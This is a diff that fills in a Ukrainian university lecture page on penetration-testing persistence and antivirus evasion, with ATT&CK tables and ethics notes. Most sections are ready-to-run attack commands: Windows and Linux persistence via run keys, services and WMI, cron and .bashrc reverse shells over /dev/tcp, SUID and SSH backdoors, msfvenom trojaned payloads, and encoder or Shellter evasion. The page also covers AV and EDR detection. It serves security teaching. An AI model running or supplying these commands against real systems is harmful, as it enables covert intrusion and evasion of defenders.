@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Конспект лекції 10: Утримання доступу та обхід антивірусів — повний текст.">
-  <meta name="author" content="Кафедра інформатики та фізико-математичних дисциплін, УжНУ">
+  <meta name="description" content="Конспект лекції 10: Утримання доступу (Persistence) та обхід антивірусів — msfvenom, encoders, evasion, EDR.">
+  <meta name="author" content="Кафедра ТЕІБ, УжНУ">
   <meta name="theme-color" content="#0ea5e9">
   <title>Конспект | Лекція 10. Утримання доступу та обхід антивірусів</title>
   <link rel="icon" type="image/svg+xml" href="../img/favicon.svg">
@@ -66,21 +66,1021 @@
     </div>
 
     <article class="lecture-content">
-      <h1>Утримання доступу та обхід антивірусів</h1>
+      <h1>Утримання доступу (Persistence) та обхід антивірусів</h1>
       <div class="lecture-info">
         <span><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align: -2px; margin-right: 4px;"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>2 год</span>
-        <span class="badge badge-locked">Скоро</span>
+        <span class="badge badge-new">Нова</span>
       </div>
 
+      <!-- ============================================================ -->
+      <!-- 10.1 Вступ до Persistence                                    -->
+      <!-- ============================================================ -->
       <section>
-        <p>Матеріали цього конспекту готуються. Слідкуйте за оновленнями.</p>
+        <h2>10.1 Вступ до Persistence</h2>
+
+        <p>Persistence (утримання доступу, закріплення) — техніки, що дозволяють зберегти доступ до скомпрометованої системи після перезавантаження, зміни паролів або інших подій, які зазвичай переривають з'єднання. У MITRE ATT&CK це тактика <strong>TA0003 — Persistence</strong>.</p>
+
+        <p>Під час пентесту persistence важлива з двох причин: по-перше, втрата доступу означає необхідність повторної експлуатації (що може бути помічено); по-друге, persistence демонструє клієнту, наскільки глибоко зловмисник може закріпитися у системі.</p>
+
+        <h3>Класифікація методів Persistence</h3>
+        <table>
+          <tr>
+            <th>Критерій</th>
+            <th>Тип</th>
+            <th>Опис</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td rowspan="2"><strong>Привілеї</strong></td>
+            <td>User-level</td>
+            <td>Працює з правами звичайного користувача</td>
+            <td>Startup folder, HKCU Run</td>
+          </tr>
+          <tr>
+            <td>Admin/SYSTEM</td>
+            <td>Потрібні адміністраторські привілеї</td>
+            <td>Services, HKLM Run, WMI</td>
+          </tr>
+          <tr>
+            <td rowspan="2"><strong>Видимість</strong></td>
+            <td>Явна (noisy)</td>
+            <td>Легко виявити стандартними інструментами</td>
+            <td>Новий сервіс, scheduled task</td>
+          </tr>
+          <tr>
+            <td>Прихована (stealthy)</td>
+            <td>Складно виявити без спеціалізованих інструментів</td>
+            <td>WMI subscription, COM hijacking</td>
+          </tr>
+          <tr>
+            <td rowspan="2"><strong>Тригер</strong></td>
+            <td>Boot/logon</td>
+            <td>Запускається при завантаженні або вході</td>
+            <td>Run keys, Startup, services</td>
+          </tr>
+          <tr>
+            <td>Event-based</td>
+            <td>Запускається при певній події</td>
+            <td>WMI event, file change</td>
+          </tr>
+        </table>
+
+        <h3>MITRE ATT&CK: техніки Persistence</h3>
+        <table>
+          <tr>
+            <th>Technique ID</th>
+            <th>Назва</th>
+            <th>Платформа</th>
+          </tr>
+          <tr>
+            <td>T1547.001</td>
+            <td>Registry Run Keys / Startup Folder</td>
+            <td>Windows</td>
+          </tr>
+          <tr>
+            <td>T1053.005</td>
+            <td>Scheduled Task</td>
+            <td>Windows</td>
+          </tr>
+          <tr>
+            <td>T1543.003</td>
+            <td>Windows Service</td>
+            <td>Windows</td>
+          </tr>
+          <tr>
+            <td>T1546.003</td>
+            <td>WMI Event Subscription</td>
+            <td>Windows</td>
+          </tr>
+          <tr>
+            <td>T1546.015</td>
+            <td>COM Object Hijacking</td>
+            <td>Windows</td>
+          </tr>
+          <tr>
+            <td>T1053.003</td>
+            <td>Cron</td>
+            <td>Linux/macOS</td>
+          </tr>
+          <tr>
+            <td>T1546.004</td>
+            <td>.bashrc / .bash_profile</td>
+            <td>Linux/macOS</td>
+          </tr>
+          <tr>
+            <td>T1098.004</td>
+            <td>SSH Authorized Keys</td>
+            <td>Linux</td>
+          </tr>
+          <tr>
+            <td>T1543.002</td>
+            <td>Systemd Service</td>
+            <td>Linux</td>
+          </tr>
+        </table>
+
+        <h3>Етичні аспекти</h3>
+        <ul>
+          <li><strong>Документувати все</strong> — кожний механізм persistence повинен бути записаний зі шляхами та параметрами</li>
+          <li><strong>Очищення (cleanup)</strong> — після пентесту обов'язково видалити всі backdoor'и</li>
+          <li><strong>Мінімальний вплив</strong> — не порушувати роботу продакшн-систем</li>
+          <li><strong>Scope</strong> — persistence повинна бути дозволена у Rules of Engagement</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 10.2 Windows Persistence                                      -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>10.2 Windows Persistence</h2>
+
+        <h3>Registry Run Keys (T1547.001)</h3>
+
+        <p>Найпростіший та найпоширеніший метод. Програми, прописані у Run keys, автоматично запускаються при кожному вході користувача або завантаженні системи.</p>
+
+        <pre><code># User-level (не потрібні адмін-привілеї)
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+# System-level (потрібні адмін-привілеї)
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+# Meterpreter — автоматична persistence через реєстр
+meterpreter&gt; run persistence -U -i 30 -p 4444 -r 192.168.1.50
+# -U = user-level, -i = interval (секунди), -p = порт, -r = host
+
+# Або через post-модуль
+meterpreter&gt; run post/windows/manage/persistence_exe \
+  REXEPATH=/tmp/payload.exe \
+  STARTUP=USER
+
+# Ручне додавання через reg
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\update.exe" /f</code></pre>
+
+        <h3>Scheduled Tasks (T1053.005)</h3>
+        <pre><code># Створення задачі, що запускається щохвилини
+schtasks /create /tn "SystemHealthCheck" /tr "C:\Users\Public\health.exe" /sc minute /mo 5 /ru SYSTEM
+
+# Задача при логіні
+schtasks /create /tn "UserSync" /tr "powershell -w hidden -ep bypass -f C:\Users\Public\sync.ps1" /sc onlogon
+
+# Задача при завантаженні
+schtasks /create /tn "NetDiag" /tr "C:\Windows\Temp\diag.exe" /sc onstart /ru SYSTEM
+
+# Meterpreter post-модуль
+meterpreter&gt; run post/windows/manage/persistence_exe \
+  REXEPATH=/tmp/payload.exe \
+  STARTUP=TASK
+
+# Перегляд задач
+schtasks /query /fo LIST /v | findstr /i "taskname next status"
+
+# Видалення (cleanup)
+schtasks /delete /tn "SystemHealthCheck" /f</code></pre>
+
+        <h3>Windows Services (T1543.003)</h3>
+        <pre><code># Створення сервісу (потрібні адмін-привілеї)
+sc create "WindowsNetDiag" binpath= "C:\Windows\Temp\svc.exe" start= auto obj= "LocalSystem" DisplayName= "Windows Network Diagnostics"
+
+# Запуск
+sc start WindowsNetDiag
+
+# Meterpreter — persistence через сервіс
+meterpreter&gt; run post/windows/manage/persistence_exe \
+  REXEPATH=/tmp/payload.exe \
+  STARTUP=SERVICE
+
+# Видалення (cleanup)
+sc stop WindowsNetDiag
+sc delete WindowsNetDiag</code></pre>
+
+        <h3>Startup Folder (T1547.001)</h3>
+        <pre><code># User-level (поточний користувач)
+C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
+
+# System-level (всі користувачі)
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
+
+# Скопіювати payload
+copy C:\Windows\Temp\payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsHelper.exe"</code></pre>
+
+        <h3>WMI Event Subscription (T1546.003)</h3>
+
+        <p>Один із найскладніших для виявлення методів. WMI (Windows Management Instrumentation) дозволяє підписатися на системні події та виконати дію при їх виникненні.</p>
+
+        <pre><code># PowerShell — створення WMI persistence
+# Тригер: кожні 60 секунд
+$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
+  Name = "CoreHealthFilter";
+  EventNamespace = "root\cimv2";
+  QueryLanguage = "WQL";
+  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+
+$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
+  Name = "CoreHealthConsumer";
+  CommandLineTemplate = "C:\Windows\Temp\health.exe"
+}
+
+Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
+  Filter = $Filter;
+  Consumer = $Consumer
+}
+
+# Meterpreter
+meterpreter&gt; run post/windows/manage/wmi_persistence \
+  PAYLOAD_PATH=C:\\Windows\\Temp\\payload.exe \
+  EVENT_ID_TRIGGER=4625</code></pre>
+
+        <h3>Інші методи Windows Persistence</h3>
+        <table>
+          <tr>
+            <th>Метод</th>
+            <th>ATT&CK</th>
+            <th>Привілеї</th>
+            <th>Складність виявлення</th>
+          </tr>
+          <tr>
+            <td><strong>DLL Hijacking</strong></td>
+            <td>T1574.001</td>
+            <td>User/Admin</td>
+            <td>Висока</td>
+          </tr>
+          <tr>
+            <td><strong>COM Object Hijacking</strong></td>
+            <td>T1546.015</td>
+            <td>User</td>
+            <td>Висока</td>
+          </tr>
+          <tr>
+            <td><strong>Screensaver backdoor</strong></td>
+            <td>T1546.002</td>
+            <td>User</td>
+            <td>Середня</td>
+          </tr>
+          <tr>
+            <td><strong>Image File Execution Options</strong></td>
+            <td>T1546.012</td>
+            <td>Admin</td>
+            <td>Середня</td>
+          </tr>
+          <tr>
+            <td><strong>AppInit DLLs</strong></td>
+            <td>T1546.010</td>
+            <td>Admin</td>
+            <td>Середня</td>
+          </tr>
+          <tr>
+            <td><strong>Netsh Helper DLL</strong></td>
+            <td>T1546.007</td>
+            <td>Admin</td>
+            <td>Висока</td>
+          </tr>
+          <tr>
+            <td><strong>Golden Ticket</strong></td>
+            <td>T1558.001</td>
+            <td>Domain Admin</td>
+            <td>Дуже висока</td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 10.3 Linux Persistence                                        -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>10.3 Linux Persistence</h2>
+
+        <h3>Cron Jobs (T1053.003)</h3>
+        <pre><code># User-level cron (не потрібен root)
+crontab -e
+# Додати рядок — кожні 5 хвилин
+*/5 * * * * /tmp/.hidden/beacon.sh
+
+# System-level cron
+echo "*/5 * * * * root /opt/.update/check.sh" &gt;&gt; /etc/crontab
+
+# Або через /etc/cron.d/
+echo "*/10 * * * * root bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.50/4444 0&gt;&amp;1'" &gt; /etc/cron.d/system-check
+
+# Meterpreter
+meterpreter&gt; run post/linux/manage/cron_persistence \
+  REMOTE_HOST=192.168.1.50 \
+  REMOTE_PORT=4444</code></pre>
+
+        <h3>Shell Profile Scripts (T1546.004)</h3>
+        <pre><code># Виконується при кожному логіні користувача
+echo 'nohup bash -c "bash -i &gt;&amp; /dev/tcp/192.168.1.50/4444 0&gt;&amp;1" &amp;' &gt;&gt; ~/.bashrc
+
+# Або в .bash_profile (при login shell)
+echo '/tmp/.hidden/connect.sh &amp;' &gt;&gt; ~/.bash_profile
+
+# Для всіх користувачів (root)
+echo '/opt/.system/beacon.sh &amp;' &gt;&gt; /etc/profile
+echo '/opt/.system/beacon.sh &amp;' &gt;&gt; /etc/bash.bashrc</code></pre>
+
+        <h3>SSH Authorized Keys (T1098.004)</h3>
+        <pre><code># Генерація ключа на атакуючій машині
+ssh-keygen -t ed25519 -f /tmp/backdoor_key -N ""
+
+# Додавання публічного ключа до authorized_keys
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... backdoor" &gt;&gt; /root/.ssh/authorized_keys
+# або
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... backdoor" &gt;&gt; /home/user/.ssh/authorized_keys
+
+# Тепер вхід без паролю:
+ssh -i /tmp/backdoor_key user@target
+
+# Приховування: встановити правильні permissions
+chmod 600 /home/user/.ssh/authorized_keys
+chmod 700 /home/user/.ssh/</code></pre>
+
+        <h3>Systemd Service (T1543.002)</h3>
+        <pre><code># Створення сервісу (потрібен root)
+cat &gt; /etc/systemd/system/system-health.service &lt;&lt; 'EOF'
+[Unit]
+Description=System Health Monitor
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/opt/.system/health-monitor
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Активація
+systemctl daemon-reload
+systemctl enable system-health.service
+systemctl start system-health.service
+
+# Перевірка
+systemctl status system-health.service</code></pre>
+
+        <h3>Інші методи Linux Persistence</h3>
+        <table>
+          <tr>
+            <th>Метод</th>
+            <th>Привілеї</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><strong>SUID Backdoor</strong></td>
+            <td>root</td>
+            <td><code>cp /bin/bash /tmp/.shell; chmod u+s /tmp/.shell</code> — SUID shell</td>
+          </tr>
+          <tr>
+            <td><strong>LD_PRELOAD</strong></td>
+            <td>root</td>
+            <td>Підміна функцій через /etc/ld.so.preload</td>
+          </tr>
+          <tr>
+            <td><strong>PAM Backdoor</strong></td>
+            <td>root</td>
+            <td>Модифікація PAM для прийняття "майстер-пароля"</td>
+          </tr>
+          <tr>
+            <td><strong>Init scripts</strong></td>
+            <td>root</td>
+            <td>/etc/init.d/ або /etc/rc.local</td>
+          </tr>
+          <tr>
+            <td><strong>Kernel Module (Rootkit)</strong></td>
+            <td>root</td>
+            <td>LKM rootkit — приховує файли, процеси, з'єднання</td>
+          </tr>
+          <tr>
+            <td><strong>at jobs</strong></td>
+            <td>User</td>
+            <td><code>echo "/tmp/beacon.sh" | at now + 1 hour</code></td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 10.4 msfvenom: створення payload'ів                          -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>10.4 msfvenom: створення payload'ів</h2>
+
+        <p><strong>msfvenom</strong> — утиліта Metasploit для генерації payload'ів у різних форматах. Замінила попередні інструменти <code>msfpayload</code> та <code>msfencode</code>. Дозволяє створювати standalone executables, shellcode, скрипти для різних платформ.</p>
+
+        <h3>Синтаксис msfvenom</h3>
+        <pre><code>msfvenom -p &lt;payload&gt; [options] -f &lt;format&gt; -o &lt;output&gt;
+
+# Основні параметри:
+-p    Payload (наприклад, windows/meterpreter/reverse_tcp)
+-f    Формат виводу (exe, elf, apk, raw, python, c, ps1...)
+-o    Вихідний файл
+-e    Encoder (наприклад, x86/shikata_ga_nai)
+-i    Кількість ітерацій кодування
+-b    Bad characters (символи, яких уникати: \x00\x0a\x0d)
+-x    Шаблон (легітимний exe для вбудовування payload)
+-k    Зберегти поведінку шаблону (payload у окремому потоці)
+-n    NOP sled розмір
+-a    Архітектура (x86, x64)
+--platform    Платформа (windows, linux, android)</code></pre>
+
+        <h3>Staged vs Stageless</h3>
+        <table>
+          <tr>
+            <th>Характеристика</th>
+            <th>Staged (meterpreter/reverse_tcp)</th>
+            <th>Stageless (meterpreter_reverse_tcp)</th>
+          </tr>
+          <tr>
+            <td><strong>Розмір</strong></td>
+            <td>Малий stager (~5 KB)</td>
+            <td>Великий (~200 KB+)</td>
+          </tr>
+          <tr>
+            <td><strong>Мережа</strong></td>
+            <td>Stager завантажує stage по мережі</td>
+            <td>Весь payload в одному файлі</td>
+          </tr>
+          <tr>
+            <td><strong>Надійність</strong></td>
+            <td>Залежить від стабільного з'єднання</td>
+            <td>Працює навіть при нестабільній мережі</td>
+          </tr>
+          <tr>
+            <td><strong>Детектування</strong></td>
+            <td>Мережевий трафік виглядає підозріло</td>
+            <td>Один файл — легше детектувати на диску</td>
+          </tr>
+          <tr>
+            <td><strong>Позначення</strong></td>
+            <td>payload<strong>/</strong>handler (slash)</td>
+            <td>payload<strong>_</strong>handler (underscore)</td>
+          </tr>
+        </table>
+
+        <h3>Формати виводу</h3>
+        <pre><code># Список доступних форматів
+msfvenom --list formats
+
+# Executable форматі
+exe, exe-small, exe-only     # Windows PE
+elf, elf-so                   # Linux ELF
+macho                         # macOS Mach-O
+apk                           # Android APK
+msi                           # Windows Installer
+dll                           # Windows DLL
+war                           # Java WAR (Tomcat)
+jar                           # Java JAR
+hta                           # HTML Application
+
+# Shellcode / transform
+raw                           # Raw shellcode
+c, csharp                     # C/C# byte array
+python, ruby, perl            # Scripting languages
+powershell, ps1               # PowerShell
+bash, sh                      # Bash script
+vba, vba-exe, vba-psh         # VBA Macros (Office)
+hex, base64                   # Encoding formats</code></pre>
+
+        <h3>Список payload'ів та encoders</h3>
+        <pre><code># Список всіх payload'ів
+msfvenom -l payloads | grep meterpreter
+
+# Список encoders
+msfvenom -l encoders
+
+# Топ encoders:
+# x86/shikata_ga_nai    — polymorphic XOR (найпопулярніший)
+# x64/xor              — XOR для x64
+# x86/countdown        — countdown encoder
+# cmd/powershell_base64 — PowerShell base64</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 10.5 msfvenom: практика з Multi/Handler                      -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>10.5 msfvenom: практика з Multi/Handler</h2>
+
+        <h3>Генерація payload'ів для різних платформ</h3>
+
+        <p><strong>Windows EXE (Reverse TCP):</strong></p>
+        <pre><code># Staged
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
+
+# Stageless
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_stageless.exe
+
+# x64
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload64.exe
+
+# HTTPS (обходить firewall)
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o payload_https.exe</code></pre>
+
+        <p><strong>Linux ELF:</strong></p>
+        <pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf
+chmod +x payload.elf
+
+# x64
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload64.elf</code></pre>
+
+        <p><strong>Android APK:</strong></p>
+        <pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o evil.apk
+
+# З вбудовуванням у легітимний APK
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x legitimate.apk -o trojan.apk</code></pre>
+
+        <p><strong>Web payload'и:</strong></p>
+        <pre><code># PHP
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
+
+# JSP (Tomcat)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
+
+# ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp
+
+# Python
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py</code></pre>
+
+        <p><strong>Shellcode (для вбудовування):</strong></p>
+        <pre><code># C format
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f c -b '\x00'
+
+# Python format
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f python
+
+# PowerShell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f ps1</code></pre>
+
+        <h3>Вбудовування у легітимний файл (Template Injection)</h3>
+        <pre><code># Вбудовування payload у легітимний exe
+# -x = шаблон, -k = зберегти оригінальну поведінку
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+  -x /usr/share/windows-binaries/plink.exe \
+  -k -f exe -o plink_trojan.exe
+
+# Результат: файл виглядає та працює як plink.exe,
+# але паралельно встановлює зворотне з'єднання</code></pre>
+
+        <h3>Налаштування Multi/Handler</h3>
+        <pre><code># Базовий handler
+msf6&gt; use exploit/multi/handler
+msf6 exploit(handler)&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(handler)&gt; set LHOST 0.0.0.0
+msf6 exploit(handler)&gt; set LPORT 4444
+msf6 exploit(handler)&gt; exploit -j       # запуск у фоновому режимі
+
+[*] Started reverse TCP handler on 0.0.0.0:4444
+[*] Sending stage (200774 bytes) to 192.168.1.100
+[*] Meterpreter session 1 opened
+
+# Handler для HTTPS
+msf6 exploit(handler)&gt; set PAYLOAD windows/meterpreter/reverse_https
+msf6 exploit(handler)&gt; set LPORT 443
+msf6 exploit(handler)&gt; exploit -j
+
+# Автоматичний handler для Android
+msf6 exploit(handler)&gt; set PAYLOAD android/meterpreter/reverse_tcp
+msf6 exploit(handler)&gt; exploit -j
+
+# Налаштування для кількох підключень
+msf6 exploit(handler)&gt; set ExitOnSession false
+msf6 exploit(handler)&gt; exploit -j</code></pre>
+
+        <h3>Методи доставки payload</h3>
+        <table>
+          <tr>
+            <th>Метод</th>
+            <th>Опис</th>
+            <th>Ризик виявлення</th>
+          </tr>
+          <tr>
+            <td><strong>USB (HID)</strong></td>
+            <td>Rubber Ducky, BadUSB — емуляція клавіатури</td>
+            <td>Низький (фізичний доступ)</td>
+          </tr>
+          <tr>
+            <td><strong>Email attachment</strong></td>
+            <td>Файл у вкладенні (macro, exe, lnk)</td>
+            <td>Середній (сканується)</td>
+          </tr>
+          <tr>
+            <td><strong>Web hosting</strong></td>
+            <td>HTTP-сервер для завантаження жертвою</td>
+            <td>Середній</td>
+          </tr>
+          <tr>
+            <td><strong>Social Engineering</strong></td>
+            <td>Переконати жертву запустити файл</td>
+            <td>Залежить від pretext</td>
+          </tr>
+          <tr>
+            <td><strong>Exploit delivery</strong></td>
+            <td>Через вразливість (browser, doc, pdf)</td>
+            <td>Високий рівень успіху</td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 10.6 Як працюють антивіруси                                   -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>10.6 Як працюють антивіруси</h2>
+
+        <p>Розуміння механізмів роботи антивірусів (AV) та систем Endpoint Detection and Response (EDR) — ключ до ефективного пентесту. Сучасний захист використовує багаторівневий підхід.</p>
+
+        <h3>Рівні захисту</h3>
+        <table>
+          <tr>
+            <th>Рівень</th>
+            <th>Метод</th>
+            <th>Коли працює</th>
+            <th>Ефективність</th>
+          </tr>
+          <tr>
+            <td><strong>1. Signature-based</strong></td>
+            <td>Порівняння з базою відомих сигнатур (хешів, byte patterns)</td>
+            <td>При скануванні файлу на диску</td>
+            <td>Висока для відомого malware, 0% для нового</td>
+          </tr>
+          <tr>
+            <td><strong>2. Heuristic</strong></td>
+            <td>Аналіз структури файлу на підозрілі патерни (packers, entropy)</td>
+            <td>При скануванні файлу</td>
+            <td>Середня, багато false positives</td>
+          </tr>
+          <tr>
+            <td><strong>3. Behavioral</strong></td>
+            <td>Моніторинг поведінки: ін'єкції, мережеві з'єднання, реєстр</td>
+            <td>Під час виконання</td>
+            <td>Висока, складно обійти</td>
+          </tr>
+          <tr>
+            <td><strong>4. Sandbox</strong></td>
+            <td>Виконання у ізольованому середовищі для аналізу</td>
+            <td>Перед доставкою / при відкритті</td>
+            <td>Висока, але може бути виявлена</td>
+          </tr>
+          <tr>
+            <td><strong>5. Cloud / ML</strong></td>
+            <td>Хмарний аналіз, машинне навчання</td>
+            <td>Постійно (потрібен інтернет)</td>
+            <td>Висока для zero-day</td>
+          </tr>
+          <tr>
+            <td><strong>6. AMSI</strong></td>
+            <td>Antimalware Scan Interface — перехоплення скриптів</td>
+            <td>PowerShell, VBScript, JScript, .NET</td>
+            <td>Висока для скриптових атак</td>
+          </tr>
+        </table>
+
+        <h3>Signature-based Detection</h3>
+        <p>Антивірус обчислює хеш файлу (MD5, SHA256) та порівнює з базою відомих загроз. Також шукає byte patterns (послідовності байтів), характерні для malware:</p>
+        <pre><code># YARA rule — приклад сигнатури
+rule Meterpreter_Reverse_TCP {
+    meta:
+        description = "Detects Meterpreter reverse TCP payload"
+    strings:
+        $s1 = { 6a 00 53 53 53 53 53 53 68 }  // socket creation pattern
+        $s2 = { fc e8 82 00 00 00 }             // typical shellcode start
+        $s3 = "metsrv"                           // Meterpreter string
+    condition:
+        any of them
+}</code></pre>
+
+        <h3>AMSI (Antimalware Scan Interface)</h3>
+        <p>AMSI — інтерфейс Windows 10+, що дозволяє антивірусу сканувати вміст скриптів <strong>перед виконанням</strong>, навіть якщо вони обфусковані:</p>
+        <pre><code># Ланцюжок AMSI:
+# PowerShell → amsi.dll → AmsiScanBuffer() → Defender → Block/Allow
+
+# Приклад: навіть base64-закодований скрипт
+# буде декодований PowerShell'ом і переданий AMSI
+# ДО фактичного виконання
+
+# AMSI бачить "фінальний" код незалежно від
+# кількості шарів обфускації</code></pre>
+
+        <h3>EDR (Endpoint Detection and Response)</h3>
+        <p>EDR — наступне покоління захисту, що йде далі за класичний AV:</p>
+        <table>
+          <tr>
+            <th>Можливість</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><strong>Process telemetry</strong></td>
+            <td>Збір інформації про всі процеси, DLL, мережеві з'єднання</td>
+          </tr>
+          <tr>
+            <td><strong>API hooking</strong></td>
+            <td>Перехоплення системних викликів (NtWriteVirtualMemory, CreateRemoteThread)</td>
+          </tr>
+          <tr>
+            <td><strong>Memory scanning</strong></td>
+            <td>Сканування пам'яті процесів на відомі payload'и</td>
+          </tr>
+          <tr>
+            <td><strong>Threat hunting</strong></td>
+            <td>Проактивний пошук загроз аналітиками SOC</td>
+          </tr>
+          <tr>
+            <td><strong>Response</strong></td>
+            <td>Автоматична ізоляція хоста, kill процесу, rollback</td>
+          </tr>
+        </table>
+
+        <p><strong>Популярні EDR:</strong> CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Carbon Black, Elastic EDR, Wazuh (OSS).</p>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 10.7 Обхід антивірусів (Evasion)                              -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>10.7 Обхід антивірусів (Evasion)</h2>
+
+        <p>Evasion — техніки обходу захисного ПЗ. MITRE ATT&CK: TA0005 — Defense Evasion. Розуміння цих технік необхідне пентестеру для демонстрації реалістичних сценаріїв атак.</p>
+
+        <h3>Encoders (кодування payload)</h3>
+
+        <p>Encoders змінюють binary pattern payload'у, зберігаючи функціональність. Це найпростіший (і найменш ефективний проти сучасних AV) метод evasion.</p>
+
+        <pre><code># shikata_ga_nai — polymorphic XOR encoder
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
+
+# Кілька encoders послідовно
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 3 \
+  -e x86/countdown -i 2 \
+  -f exe -o multi_encoded.exe
+
+# Уникнення bad characters
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+  -b '\x00\x0a\x0d' -f exe -o no_nulls.exe
+
+# УВАГА: encoders самі по собі НЕ достатні для обходу
+# сучасних AV. Вони змінюють сигнатуру, але stub декодера
+# сам стає новою сигнатурою.</code></pre>
+
+        <h3>Packers та Crypters</h3>
+
+        <p><strong>Packer</strong> — стискає executable та розпаковує в пам'яті при запуску. <strong>Crypter</strong> — шифрує payload, stub дешифрує та запускає в пам'яті.</p>
+
+        <table>
+          <tr>
+            <th>Інструмент</th>
+            <th>Тип</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><strong>UPX</strong></td>
+            <td>Packer (OSS)</td>
+            <td>Стиснення exe. Виявляється всіма AV через відомий stub</td>
+          </tr>
+          <tr>
+            <td><strong>Themida</strong></td>
+            <td>Protector</td>
+            <td>Комерційний. Anti-debug, VM detection, code obfuscation</td>
+          </tr>
+          <tr>
+            <td><strong>Veil-Evasion</strong></td>
+            <td>Framework</td>
+            <td>Генерація AV-bypassing payload'ів. Python/C/Go stubs</td>
+          </tr>
+          <tr>
+            <td><strong>Shellter</strong></td>
+            <td>Injector</td>
+            <td>Ін'єкція shellcode у легітимний 32-bit PE. Динамічний аналіз</td>
+          </tr>
+          <tr>
+            <td><strong>ScareCrow</strong></td>
+            <td>Framework</td>
+            <td>Створення loader'ів з використанням легітимних DLL (syscalls)</td>
+          </tr>
+        </table>
+
+        <pre><code># Veil-Evasion
+$ veil
+Veil&gt; use 1  # Evasion
+Veil/Evasion&gt; list  # список payload'ів
+Veil/Evasion&gt; use python/meterpreter/rev_tcp
+[python/meterpreter/rev_tcp]&gt; set LHOST 192.168.1.50
+[python/meterpreter/rev_tcp]&gt; set LPORT 4444
+[python/meterpreter/rev_tcp]&gt; generate
+
+# Shellter — ін'єкція в легітимний exe
+$ shellter
+[?] PE Target: /usr/share/windows-binaries/putty.exe
+[?] Stealth Mode (Y/N): Y
+[?] Payload: custom (msfvenom shellcode)
+# Результат: putty.exe з вбудованим reverse shell</code></pre>
+
+        <h3>Code Obfuscation</h3>
+
+        <p>Обфускація коду змінює структуру без зміни функціональності:</p>
+        <pre><code># PowerShell obfuscation — Invoke-Obfuscation
+# Оригінал:
